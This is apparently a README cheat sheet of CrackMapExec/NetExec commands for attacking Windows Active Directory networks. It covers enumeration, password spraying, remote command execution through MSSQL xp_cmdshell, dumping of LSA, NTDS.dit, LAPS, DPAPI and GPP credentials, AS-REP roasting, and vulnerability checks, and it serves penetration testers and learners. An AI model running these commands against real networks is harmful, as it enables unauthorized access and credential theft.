# cme-nxc-cheat-sheet
A cheat sheet for CrackMapExec and NetExec

**CrackMapExec:** https://github.com/byt3bl33d3r/CrackMapExec (no longer maintained)

**NetExec:** https://github.com/Pennyw0rth/NetExec

Installation: https://www.netexec.wiki/getting-started/installation

> The same commands for crackmapexec would also work for NetExec

> Other names: cme, nxc 
# Enumeration
## Initial Enumeration
```bash
crackmapexec smb target
```
## Null Authentication
```bash
crackmapexec smb target -u '' -p ''
```
## Guest Authentication
```bash
crackmapexec smb target -u 'guest' -p ''
```
## List Shares
```bash
crackmapexec smb target -u '' -p '' --shares
```
```bash
crackmapexec smb target -u username -p password --shares
```
## List Usernames
```bash
crackmapexec smb target -u '' -p '' --users
```
```bash
crackmapexec smb target -u '' -p '' --rid-brute
```
```bash
crackmapexec smb target -u username -p password --users
```
## Local Authentication
```bash
crackmapexec smb target -u username -p password --local-auth
```
## Using Kerberos
```bash
crackmapexec smb target -u username -p password -k
```
## Check for hosts that have SMB signing disabled
```bash
crackmapexec smb target(s) --gen-relay-list relay.txt
```
# Spraying
## Password Spray
```bash
crackmapexec smb target -u users.txt -p password --continue-on-success
```
```bash
crackmapexec smb target -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success
```
```bash
crackmapexec ssh target(s) -u username -p password --continue-on-success
```
# SMB
## Spider_plus Module
```bash
crackmapexec smb target -u username -p password -M spider_plus
```
```bash
crackmapexec smb target -u username -p password -M spider_plus -o READ_ONLY=false
```
## Dump a specific file
```bash
crackmapexec smb target -u username -p password -k --get-file target_file output_file --share sharename
```
# LDAP
## Enumerate users using ldap
```bash
crackmapexec ldap target -u '' -p '' --users
```
# MSSQL
## Authentication
```bash
crackmapexec mssql target -u username -p password
```
## Execute commands using `xp_cmdshell`
> -X for powershell and -x for cmd
```bash
crackmapexec mssql target -u username -p password -x command_to_execute
```
## Get a file
```bash
crackmapexec mssql target -u username -p password --get-file output_file target_file
```
# Secrets Dump
## Dump LSA secrets
```bash
crackmapexec smb target -u username -p password --local-auth --lsa
```
## gMSA
```bash
crackmapexec ldap target -u username -p password --gmsa-convert-id id
```
```bash
crackmapexec ldap domain -u username -p password --gmsa-decrypt-lsa gmsa_account
```
### Group Policy Preferences
```bash
crackmapexec smb target -u username -p password -M gpp_password
```
## Dump LAPS password
```bash
crackmapexec smb target -u username -p password --laps
```
## Dump dpapi credentials
```bash
crackmapexec smb target -u username -p password --laps --dpapi
```
## Dump NTDS.dit
```bash
crackmapexec smb target -u username -p password --ntds
```
# Asreproast
```bash
crackmapexec ldap target -u username -p password --asreproast asrep.txt
```
# Bloodhound
```bash
crackmapexec ldap target -u username -p password --bloodhound -ns ip --collection All
```
# Useful Modules
## Webdav
Checks whether the WebClient service is running on the target
```bash
crackmapexec smb ip -u username -p password -M webdav 
```
## Veeam
Extracts credentials from local Veeam SQL Database
```bash
crackmapexec smb target -u username -p password -M veeam
```
## ldap-checker
Checks whether LDAP signing and binding are required and/or enforced
```bash
cme ldap target -u username -p password -M ldap-checker
```
## Check if the DC is vulnerable to zerologon, petitpotam, nopac
```bash
crackmapexec smb target -u username -p password -M zerologon
```
```bash
crackmapexec smb target -u username -p password -M petitpotam
```
```bash
crackmapexec smb target -u username -p password -M nopac
```
## Check the MachineAccountQuota
```bash
crackmapexec ldap target -u username -p password -M maq
```
## ADCS Enumeration
```bash
crackmapexec ldap target -u username -p password -M adcs
```
